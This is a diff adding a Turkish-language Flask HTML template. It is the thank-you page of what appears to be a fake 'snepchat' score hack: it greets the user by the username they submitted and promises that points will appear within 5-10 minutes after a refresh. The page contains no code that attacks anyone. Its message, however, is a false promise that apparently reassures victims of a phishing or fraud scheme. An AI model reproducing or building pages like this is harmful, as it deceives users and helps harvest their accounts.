@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Teşekkürler</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- HARİCİ CSS -->
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+
+<body>
+
+<h1 class="ust-baslik">2026 snepchat puanı hilesini kullandığınız için teşekkür ederiz </h1>
+
+  <div class="container" style="text-align:center;">
+
+    {% if kullaniciadi %}
+      <h2>harika {{ kullaniciadi }}!</h2>
+    {% else %}
+      <h2>Harika</h2>
+    {% endif %}
+
+    <p>
+      5-10 dakikaya kadar snepchat puanın yüklenecektir birazdan çıkıp girip sayfayı yenilemen yeterlidir.
+    </p>
+
+  </div>
+
+</body>
+</html>
